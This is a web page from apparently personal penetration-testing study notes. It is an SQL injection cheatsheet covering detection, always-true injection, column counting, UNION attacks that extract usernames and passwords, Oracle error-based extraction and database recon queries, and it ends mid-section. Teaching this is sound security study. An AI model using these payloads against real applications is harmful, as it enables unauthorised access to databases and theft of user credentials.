<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>SQL Injection Cheatsheet - Penetration Testing Notes</title> <link rel="shortcut icon" href="/pen-test-docs/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/pen-test-docs/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/pen-test-docs/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/pen-test-docs/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>SQL Injection Cheatsheet | Penetration Testing Notes</title> <meta name="generator" content="Jekyll v3.9.2" /> <meta property="og:title" content="SQL Injection Cheatsheet" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="Documented notes and learning for penetration testing and related cyber security testing." /> <meta property="og:description" content="Documented notes and learning for penetration testing and related cyber security testing." /> <link rel="canonical" href="https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html" /> <meta property="og:url" content="https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html" /> <meta property="og:site_name" content="Penetration Testing Notes" /> <meta property="og:type" content="website" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="SQL Injection Cheatsheet" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"Documented notes and learning for penetration testing and related cyber security testing.","headline":"SQL Injection Cheatsheet","url":"https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <script type="text/javascript" src="/pen-test-docs/assets/js/toggle_init.js"></script> <div class="side-bar"> <div class="site-header"> <a href="/pen-test-docs/" class="site-title lh-tight"> Penetration Testing Notes </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/" class="nav-list-link">Home</a></li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/setting-up/setting-up.html" class="nav-list-link">Setting Up</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/setting-up/Logging.html" class="nav-list-link">CLI Logging</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Containers.html" class="nav-list-link">Containers</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/operating-systems.html" class="nav-list-link">Operating Systems</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Screenshotting.html" class="nav-list-link">Screenshotting</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/useful-git-repos.html" class="nav-list-link">Useful Github Repos</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/virtual-private-servers.html" class="nav-list-link">Virtual Private Servers</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Virtualization.html" class="nav-list-link">Virtualization</a></li> </ul> </li> <li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/Attacks%20Index.html" class="nav-list-link active">Attacks</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/osint/OSINT%20Index.html" class="nav-list-link">Open-source Intelligence</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/osint/OSINT%20Framework.html" class="nav-list-link">OSINT Framework</a></li> </ul> </li> <li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Index.html" class="nav-list-link active">SQL Injection</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/sql-injection/Introduction.html" class="nav-list-link">Introduction</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/sql-injection/Basic%20SQL%20Syntax.html" class="nav-list-link">Basic SQL Syntax</a></li> <li class="nav-list-item active"><a href="/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html" class="nav-list-link active">SQL Injection Cheatsheet</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/web-application/Web%20Application%20Index.html" class="nav-list-link">Web Application</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html" class="nav-list-link">Cross-Site Request Forgery (CSRF)</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html" class="nav-list-link">Cross-Site Scripting (XSS)</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Directory%20Enumeration%20Attack.html" class="nav-list-link">Directory Enumeration Attack</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Server%20Side%20Includes%20(SSI%20Framework)%20(.shtml).html" class="nav-list-link">Server Side Includes (SSI Framework) (.shtml)</a></li> </ul> </li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Knowledge%20Index.html" class="nav-list-link">Knowledge</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Networks/Networks%20Index.html" class="nav-list-link">Networks</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html" class="nav-list-link">TCP/IP Framework</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Networks/Wireless%20Network%20Security.html" class="nav-list-link">Wireless Network Security</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Testing/Testing%20Index.html" class="nav-list-link">Testing</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html" class="nav-list-link">Application Security Testing Methods</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Tools/Tools%20Index.html" class="nav-list-link">Tools</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Tools/Nmap.html" class="nav-list-link">Nmap</a></li> </ul> </li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Courses/Courses%20Index.html" class="nav-list-link">Courses</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Courses/Penetration%20Testing%20Fundamentals%20Bootcamp.html" class="nav-list-link">Penetration Testing Fundamentals Bootcamp</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/labs%20index.html" class="nav-list-link">Practice Labs</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/overthewire/overthewire%20index.html" class="nav-list-link">OverTheWire</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/overthewire/Bandit.html" class="nav-list-link">Bandit Lab</a></li> </ul> </li> <li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/tryhackme/tryhackme%20index.html" class="nav-list-link">TryHackMe</a></li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/vulnhub/vulnhub%20index.html" class="nav-list-link">VulnHub</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/vulnhub/Empire%20-%20Breakout.html" class="nav-list-link">Empire: Breakout CTF</a></li> </ul> </li> </ul> </li> </ul> </nav> <footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll. </footer> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search Penetration Testing Notes" aria-label="Search Penetration Testing Notes" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> <nav aria-label="Auxiliary" class="aux-nav"> <ul class="aux-nav-list"> <li class="aux-nav-list-item"> <a href="//github.com/alipali737/pen-test-docs" class="site-button" > Github Source </a> </li> </ul> </nav> </div> <div id="main-content-wrap" class="main-content-wrap"> <nav aria-label="Breadcrumb" class="breadcrumb-nav"> <ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"> <a href="/pen-test-docs/Attacks/Attacks%20Index.html">Attacks</a> </li><li class="breadcrumb-nav-list-item"> <a href="/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Index.html">SQL Injection</a> </li><li class="breadcrumb-nav-list-item"> <span>SQL Injection Cheatsheet</span> </li> </ol> </nav> <div id="main-content" class="main-content" role="main"> <h1 class="no_toc" id="sql-injection-cheatsheet"> <a href="#sql-injection-cheatsheet" class="anchor-heading" aria-labelledby="sql-injection-cheatsheet"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SQL Injection Cheatsheet </h1> <details open=""> <summary class="text-delta"> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Table of contents
</code></pre></div> </div> </summary> <ul id="markdown-toc"> <li><a href="#detecting-sql-injection-vulnerabilities" id="markdown-toc-detecting-sql-injection-vulnerabilities">Detecting SQL Injection Vulnerabilities</a></li> <li><a href="#sql-injection-in-different-parts-of-the-query" id="markdown-toc-sql-injection-in-different-parts-of-the-query">SQL Injection in Different Parts of the Query</a></li> <li><a href="#sql-injection-type-examples" id="markdown-toc-sql-injection-type-examples">SQL Injection Type Examples</a></li> <li><a href="#basic-sql-statement" id="markdown-toc-basic-sql-statement">Basic SQL Statement</a></li> <li><a href="#handling-different-sql-system-syntax" id="markdown-toc-handling-different-sql-system-syntax">Handling Different SQL System Syntax</a></li> <li><a href="#basic-evaluate-true-return-all" id="markdown-toc-basic-evaluate-true-return-all">Basic Evaluate True (Return All)</a></li> <li><a href="#determining-the-number-of-columns-in-a-table" id="markdown-toc-determining-the-number-of-columns-in-a-table">Determining the number of columns in a table</a></li> <li><a href="#union-attacks" id="markdown-toc-union-attacks">UNION Attacks</a> <ul> <li><a href="#append-a-blank-table-to-the-end-of-the-list-with-null-values" id="markdown-toc-append-a-blank-table-to-the-end-of-the-list-with-null-values">Append a blank table to the end of the list with NULL values</a></li> <li><a href="#finding-columns-that-have-a-useful-data-type" id="markdown-toc-finding-columns-that-have-a-useful-data-type">Finding columns that have a useful data type</a></li> <li><a href="#retrieving-information-from-another-table" id="markdown-toc-retrieving-information-from-another-table">Retrieving information from another table</a></li> <li><a href="#retrieving-multiple-values-within-a-single-column" id="markdown-toc-retrieving-multiple-values-within-a-single-column">Retrieving multiple values within a single column</a></li> </ul> </li> <li><a href="#error-based-extraction" id="markdown-toc-error-based-extraction">Error Based Extraction</a> <ul> <li><a href="#oracle-based" id="markdown-toc-oracle-based">Oracle Based:</a></li> </ul> </li> <li><a href="#discovering-system-information" id="markdown-toc-discovering-system-information">Discovering System Information</a></li> <li><a href="#blind-sql-injection-vulnerabilities" id="markdown-toc-blind-sql-injection-vulnerabilities">Blind SQL Injection Vulnerabilities</a></li> <li><a href="#second-order-sql-injection" id="markdown-toc-second-order-sql-injection">Second-order SQL Injection</a></li> </ul> </details><hr /> <h2 id="detecting-sql-injection-vulnerabilities"> <a href="#detecting-sql-injection-vulnerabilities" class="anchor-heading" aria-labelledby="detecting-sql-injection-vulnerabilities"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Detecting SQL Injection Vulnerabilities </h2> <p>Web scanner tools can be used for this purpose for quick and efficient detection but these can also be detected manually. This manual process consists of a systematic set of tests against every entry point in the application, these typically involve:</p> <ul> <li>Submitting single quote character <code class="language-plaintext highlighter-rouge">'</code> and looking for errors or anomalies</li> <li>Submitting SQL-specific syntax an observable chance could be evaluated</li> <li>Submitting Boolean conditions and looking for differences <code class="language-plaintext highlighter-rouge">OR 1=1</code> and <code class="language-plaintext highlighter-rouge">OR 1=2</code></li> <li>Submitting payloads designed to trigger time delays when executed and observing response times</li> <li>Performing <a href="https://alipali737.github.io/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast">OAST</a> methods to trigger an out-of-band network interaction when executed within a SQL query</li> </ul> <h2 id="sql-injection-in-different-parts-of-the-query"> <a href="#sql-injection-in-different-parts-of-the-query" class="anchor-heading" aria-labelledby="sql-injection-in-different-parts-of-the-query"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SQL Injection in Different Parts of the Query </h2> <p>Generally, most SQLi vulnerabilities arise within the <code class="language-plaintext highlighter-rouge">WHERE</code> clause of a <code class="language-plaintext highlighter-rouge">SELECT</code> query. However, SQLi vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations are:</p> <ul> <li>In <code class="language-plaintext highlighter-rouge">UPDATE</code> statements, within the <em>updated values</em> or the <code class="language-plaintext highlighter-rouge">WHERE</code> clause.</li> <li>In <code class="language-plaintext highlighter-rouge">INSERT</code> statements, within the <em>inserted values</em>.</li> <li>In <code class="language-plaintext highlighter-rouge">SELECT</code> statements, within the table or column name.</li> <li>In <code class="language-plaintext highlighter-rouge">SELECT</code> statements, within the <code class="language-plaintext highlighter-rouge">ORDER BY</code> clause.</li> </ul> <h2 id="sql-injection-type-examples"> <a href="#sql-injection-type-examples" class="anchor-heading" aria-labelledby="sql-injection-type-examples"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SQL Injection Type Examples </h2> <p>There are many SQLi vulnerabilities, attacks, and techniques, which all arise in different situations. Some more common ones include:</p> <ul> <li><em>Retrieving hidden data</em>, where you modify a SQL query to return additional results.</li> <li><em>Subverting application logic</em>, where you can change a query to interfere with the application’s logic.</li> <li><em><a href="https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#union-attacks">UNION attacks</a></em>, where you can retrieve data from different database tables.</li> <li><em><a href="https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#blind-sql-injection-vulnerabilities">Blind SQL injection</a></em>, where the results of a query you control are not returned in the application’s responses.</li> </ul> <h2 id="basic-sql-statement"> <a href="#basic-sql-statement" class="anchor-heading" aria-labelledby="basic-sql-statement"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Basic SQL Statement </h2> <p>A large amount of SQL statements on something like a product search page will be structured similarly too:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="err">{</span><span class="k">some</span><span class="o">-</span><span class="k">table</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">}</span> <span class="k">WHERE</span> <span class="err">{</span><span class="k">some</span><span class="o">-</span><span class="n">field</span><span class="err">}</span> <span class="o">=</span> <span class="s1">'{some-query}'</span>

<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">categories</span> <span class="o">=</span> <span class="s1">'Gifts'</span> <span class="k">AND</span> <span class="n">released</span> <span class="o">=</span> <span class="mi">1</span></code></pre></figure> <h2 id="handling-different-sql-system-syntax"> <a href="#handling-different-sql-system-syntax" class="anchor-heading" aria-labelledby="handling-different-sql-system-syntax"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Handling Different SQL System Syntax </h2> <p>There is a variety of SQL platforms available now and each use slightly different SQL syntax to carry out operations. A useful cheatsheet can be found on the <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger SQL Injection Cheat Sheet</a> here that details the different syntax for each main platform. There is also a fairly comprehensive cheat sheet <a href="https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">here</a> for different systems.</p> <h2 id="basic-evaluate-true-return-all"> <a href="#basic-evaluate-true-return-all" class="anchor-heading" aria-labelledby="basic-evaluate-true-return-all"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Basic Evaluate True (Return All) </h2> <p>A very basic way to exploit a statement like the above would be to break out of the quotes and then add a statement that always evaluates as true and comment out the final section of the statement.</p> <p>Adding a simple <code class="language-plaintext highlighter-rouge">' OR 1=1--</code>, escapes the categories field value by ending the quotes, adds an <code class="language-plaintext highlighter-rouge">OR</code> statement followed by a statement that always evaluates as True. Finally we use a <code class="language-plaintext highlighter-rouge">--</code> to comment out any other statements following in the query.</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">categories</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- ' AND released = 1</span></code></pre></figure> <h2 id="determining-the-number-of-columns-in-a-table"> <a href="#determining-the-number-of-columns-in-a-table" class="anchor-heading" aria-labelledby="determining-the-number-of-columns-in-a-table"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Determining the number of columns in a table </h2> <p>Finding out the number of columns in a table can be very useful for construction a <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION attack</a> as to <code class="language-plaintext highlighter-rouge">UNION</code> another table to the result you need to match the number of columns. This means before we can create this attack we need to determine how many columns are in the current table.</p> <p>To do this we can use the <code class="language-plaintext highlighter-rouge">ORDER BY</code> command to determine how many columns are in the table. By escaping a parameter and then adding an <code class="language-plaintext highlighter-rouge">ORDER BY 1--</code> you can control the order of the results by sorting based on the column index specified.</p> <p>This means that you can increase the number until you get a server error (indicating that you have tried to select a column index out of range) allowing you to determine the number of columns in a table.</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' ORDER BY 1--
'</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">2</span><span class="c1">--</span>
<span class="s1">' ORDER BY 3--
etc</span></code></pre></figure> <h2 id="union-attacks"> <a href="#union-attacks" class="anchor-heading" aria-labelledby="union-attacks"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> UNION Attacks </h2> <p><code class="language-plaintext highlighter-rouge">UNION</code> Attacks are where you use a <code class="language-plaintext highlighter-rouge">UNION</code> command to attach a secondary/multiple more statements to the end of an SQL command to retrieve information from another table or different columns.</p> <p>Some key requirements for a UNION attack is that the number of columns that are being appended to the bottom of the original result have to match. You can determine the number of columns of a table using a method described in <a href="https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#determining-the-number-of-columns-in-a-table">Determining the number of columns in a table</a></p> <p>More information can also be found on the <a href="https://portswigger.net/web-security/sql-injection/union-attacks">PortSwigger UNION Attacks</a> page.</p> <h4 id="append-a-blank-table-to-the-end-of-the-list-with-null-values"> <a href="#append-a-blank-table-to-the-end-of-the-list-with-null-values" class="anchor-heading" aria-labelledby="append-a-blank-table-to-the-end-of-the-list-with-null-values"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Append a blank table to the end of the list with NULL values </h4> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' UNION SELECT NULL,NULL,NULL--</span></code></pre></figure> <h4 id="finding-columns-that-have-a-useful-data-type"> <a href="#finding-columns-that-have-a-useful-data-type" class="anchor-heading" aria-labelledby="finding-columns-that-have-a-useful-data-type"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Finding columns that have a useful data type </h4> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' UNION SELECT '</span><span class="n">a</span><span class="s1">',NULL,NULL,NULL--
'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span><span class="s1">'a'</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
<span class="s1">' UNION SELECT NULL,NULL,'</span><span class="n">a</span><span class="s1">',NULL--
'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="s1">'a'</span><span class="c1">--</span></code></pre></figure> <h4 id="retrieving-information-from-another-table"> <a href="#retrieving-information-from-another-table" class="anchor-heading" aria-labelledby="retrieving-information-from-another-table"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Retrieving information from another table </h4> <ul> <li>For this you must make sure that you follow the appropriate number of columns needed for the UNION to work</li> <li>This also requires you to know the column names and table name for the data you wish to access</li> </ul> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' UNION SELECT username, password FROM users--</span></code></pre></figure> <h4 id="retrieving-multiple-values-within-a-single-column"> <a href="#retrieving-multiple-values-within-a-single-column" class="anchor-heading" aria-labelledby="retrieving-multiple-values-within-a-single-column"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Retrieving multiple values within a single column </h4> <ul> <li>If you wish to return data that is more columns that the original query you can concatinate the data from the extracted table into a single column</li> <li>This could also be required if you only have limited columns that support the data type you require</li> </ul> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' UNION SELECT username || '</span><span class="o">-</span><span class="s1">' || password FROM users--
'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span><span class="n">username</span> <span class="o">||</span> <span class="s1">'-'</span> <span class="o">||</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span><span class="c1">--</span></code></pre></figure> <h2 id="error-based-extraction"> <a href="#error-based-extraction" class="anchor-heading" aria-labelledby="error-based-extraction"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Error Based Extraction </h2> <ul> <li>If an application simply just returns an error to the user, data could possibly be extracted. A simple workflow could go as follows: <h3 id="oracle-based"> <a href="#oracle-based" class="anchor-heading" aria-labelledby="oracle-based"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Oracle Based: </h3> <ol> <li>Try a simple error (this proves we can run SQL but fails because it wants a bool)</li> </ol> </li> </ul> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' AND CAST((SELECT 1) AS int)--</span></code></pre></figure> <ol> <li>Make it a bool condition (the error will no go away)</li> </ol> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' AND 1=CAST((SELECT 1) AS int)-- </span></code></pre></figure> <ol> <li>Extract information (this will fail as it tries to convert string to int, logging the string in the error)</li> </ol> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></code></pre></figure> <h2 id="discovering-system-information"> <a href="#discovering-system-information" class="anchor-heading" aria-labelledby="discovering-system-information"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Discovering System Information </h2> <ul> <li>There is often varibles and tables that come as default for many SQL implementations that details the versions and technologies used</li> <li>These are specific to the languag but can be very helpful for recon on the target</li> </ul> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="c1">-- Oracle:</span>
<span class="k">SELECT</span> <span class="n">banner</span> <span class="k">FROM</span> <span class="n">v</span><span class="err">$</span><span class="k">version</span>
<span class="k">SELECT</span> <span class="n">banner</span> <span class="k">FROM</span> <span class="n">v</span><span class="err">$</span><span class="k">version</span> <span class="k">WHERE</span> <span class="n">banner</span> <span class="k">LIKE</span> <span class="err">‘</span><span class="n">Oracle</span><span class="o">%</span><span class="err">’</span>
<span class="k">SELECT</span> <span class="n">banner</span> <span class="k">FROM</span> <span class="n">v</span><span class="err">$</span><span class="k">version</span> <span class="k">WHERE</span> <span class="n">banner</span> <span class="k">LIKE</span> <span class="err">‘</span><span class="n">TNS</span><span class="o">%</span><span class="err">’</span>
<span class="k">SELECT</span> <span class="k">version</span> <span class="k">FROM</span> <span class="n">v</span><span class="err">$</span><span class="n">instance</span></code></pre></figure> <p>The queries to determine the database version for some popular database types are as follows:</p> <div class="table-wrapper"><table> <thead> <tr> <th> </th> <th> </th> </tr> </thead> <tbody> <tr> <td>Database type</td> <td>Query</td> </tr> <tr> <td>Microsoft, MySQL</td> <td><code class="language-plaintext highlighter-rouge">SELECT @@version</code></td> </tr> <tr> <td>Oracle</td> <td><code class="language-plaintext highlighter-rouge">SELECT * FROM v$version</code></td> </tr> <tr> <td>PostgreSQL</td> <td><code class="language-plaintext highlighter-rouge">SELECT version()</code></td> </tr> </tbody> </table></div> <p>For most database types (notably excluding Oracle) a set of views called the <em>Information schema</em> can provide database information:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span></code></pre></figure> <p>This will return something like this:</p> <div class="table-wrapper"><table> <thead> <tr> <th>TABLE_CATALOG</th> <th>TABLE_SCHEMA</th> <th>TABLE_NAME</th> <th>TABLE_TYPE</th> </tr> </thead> <tbody> <tr> <td>MyDatabase</td> <td>dbo</td> <td>Products</td> <td>BASE TABLE</td> </tr> <tr> <td>MyDatabase</td> <td>dbo</td> <td>Users</td> <td>BASE TABLE</td> </tr> <tr> <td>OtherDatabase</td> <td>public</td> <td>Feedback</td> <td>BASE TABLE</td> </tr> </tbody> </table></div> <p>Finding columns is simple after this:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">'Users'</span></code></pre></figure> <p>Equivalent information for <em>Oracle</em>:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">all_tables</span>
